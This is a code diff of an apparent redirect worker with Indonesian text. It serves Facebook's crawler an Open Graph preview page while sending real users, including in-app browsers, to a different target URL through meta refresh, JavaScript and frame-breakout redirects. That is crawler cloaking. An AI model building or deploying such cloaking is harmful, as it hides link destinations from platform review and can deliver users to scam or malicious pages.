@@ -60,24 +60,17 @@ async function handleRedirect(req, env, sub, ctx) {
   const data = JSON.parse(dataRaw);
   const ua = req.headers.get('User-Agent') || '';
   
-  // PERBAIKAN KRITIS: Bedakan dengan sangat jelas
-  // 1. Facebook Crawler (untuk preview) - Kasih OG HTML
-  // 2. Facebook App/WebView (user nyata) - Kasih Redirect HTML
-  // 3. Browser biasa - Kasih Redirect HTML
-  
   const isFacebookCrawler = /facebookexternalhit|Facebot/i.test(ua);
-  const isFacebookApp = /FBAN|FBAV|FB_IAB/i.test(ua); // Facebook In-App Browser
+  const isFacebookApp = /FBAN|FBAV|FB_IAB/i.test(ua);
   const isInstagramApp = /Instagram/i.test(ua);
   const isMessengerApp = /Messenger/i.test(ua);
   const isWhatsApp = /WhatsApp/i.test(ua);
   
-  // Hanya crawler yang dapat OG HTML, selain itu redirect
   const isRealUser = isFacebookApp || isInstagramApp || isMessengerApp || isWhatsApp || !isFacebookCrawler;
 
   ctx.waitUntil(updateStats(env, sub));
 
   if (isFacebookCrawler && !isFacebookApp) {
-    // Crawler saja yang dapat OG HTML
     return new Response(getOgHTML(data, sub), {
       status: 200,
       headers: { 
@@ -88,7 +81,6 @@ async function handleRedirect(req, env, sub, ctx) {
     });
   }
 
-  // SEMUA user nyata (termasuk Facebook/IG/Messenger) dapat redirect HTML
   return new Response(getRedirectHTML(data.targetUrl), {
     status: 200,
     headers: { 
@@ -169,46 +161,44 @@ async function updateStats(env, sub) {
 function getRedirectHTML(url) {
   const cleanUrl = url.replace(/"/g, '&quot;').replace(/'/g, '&#39;');
   
-  // PERBAIKAN: Gunakan meta refresh sebagai primary method untuk Facebook Browser
-  // Facebook Browser sering blokir JavaScript redirect tapi jarang blokir meta refresh
   return `<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta http-equiv="refresh" content="0; url=${cleanUrl}">
+    <meta http-equiv="refresh" content="1; url=${cleanUrl}">
     <title>Redirecting...</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-        .container{background:white;padding:30px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center;max-width:400px;width:100%}
-        .spinner{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #1877f2;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
+        .container{background:white;padding:25px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center;max-width:380px;width:100%;animation:fadeIn 0.4s ease-out}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
+        .spinner{width:28px;height:28px;border:3px solid #f0f2f5;border-top:3px solid #1877f2;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 12px}
         @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        h2{color:#1c1e21;margin-bottom:10px;font-size:18px}
-        p{color:#65676b;margin-bottom:20px;font-size:14px;line-height:1.5}
-        .btn{display:inline-block;background:#1877f2;color:white;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:600;font-size:16px;width:100%;margin-bottom:10px}
+        .dots{display:flex;justify-content:center;gap:4px;margin:10px 0 15px}
+        .dot{width:5px;height:5px;background:#1877f2;border-radius:50%;animation:bounce 1.4s infinite ease-in-out both}
+        .dot:nth-child(1){animation-delay:-0.32s}
+        .dot:nth-child(2){animation-delay:-0.16s}
+        @keyframes bounce{0%,80%,100%{transform:scale(0.6);opacity:0.5}40%{transform:scale(1);opacity:1}}
+        h2{color:#1c1e21;margin-bottom:6px;font-size:16px;font-weight:600}
+        p{color:#65676b;margin-bottom:5px;font-size:13px;line-height:1.4}
+        .btn{display:inline-block;background:#1877f2;color:white;padding:10px 20px;border-radius:6px;text-decoration:none;font-weight:600;font-size:14px;width:100%;margin-top:10px;transition:all 0.2s}
         .btn:active{background:#166fe5;transform:scale(0.98)}
-        .url-text{font-size:12px;color:#8a8d91;word-break:break-all;margin-top:15px;padding-top:15px;border-top:1px solid #e4e6eb}
+        .url-text{font-size:11px;color:#8a8d91;word-break:break-all;margin-top:12px;padding-top:12px;border-top:1px solid #e4e6eb}
     </style>
     <script>
-        // Multiple redirect attempts untuk berbagai browser
-        window.onload = function() {
-            // Method 1: Direct location change
-            window.location.href = "${cleanUrl}";
-            
-            // Method 2: Replace (untuk history)
-            setTimeout(function() {
-                window.location.replace("${cleanUrl}");
-            }, 50);
-            
-            // Method 3: Open in top window (untuk iframe)
-            if (window.top !== window.self) {
-                window.top.location = "${cleanUrl}";
-            }
+        window.onload = function(){
+            setTimeout(function(){
+                window.location.href = "${cleanUrl}";
+                setTimeout(function(){
+                    window.location.replace("${cleanUrl}");
+                }, 50);
+                if(window.top !== window.self){
+                    window.top.location = "${cleanUrl}";
+                }
+            }, 1000);
         };
-        
-        // Fallback jika user klik anywhere
-        document.addEventListener('click', function() {
+        document.addEventListener('click', function(){
             window.location.href = "${cleanUrl}";
         });
     </script>
@@ -218,6 +208,7 @@ function getRedirectHTML(url) {
         <div class="spinner"></div>
         <h2>Sedang membuka link...</h2>
         <p>Tunggu sebentar, Anda akan dialihkan otomatis</p>
+        <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
         <a href="${cleanUrl}" class="btn">Buka Link Sekarang</a>
         <div class="url-text">${cleanUrl}</div>
     </div>
@@ -226,7 +217,7 @@ function getRedirectHTML(url) {
 }
 
 function getOgHTML(d, sub) {
-  const img = d.imageUrl || 'https://via.placeholder.com/1200x630/1877f2/ffffff?text=Video';
+  const img = d.imageUrl || 'https://via.placeholder.com/1200x630/1877f2/ffffff?text=Video ';
   const title = (d.title || '').replace(/"/g, '&quot;');
   const desc = (d.description || '').replace(/"/g, '&quot;');
   const domain = d.domain || '';
@@ -381,4 +372,4 @@ function getDashboardHTML(domains) {
 
 function json(d, s = 200) {
   return new Response(JSON.stringify(d), {status: s, headers: {'Content-Type': 'application/json'}});
-      }
+}
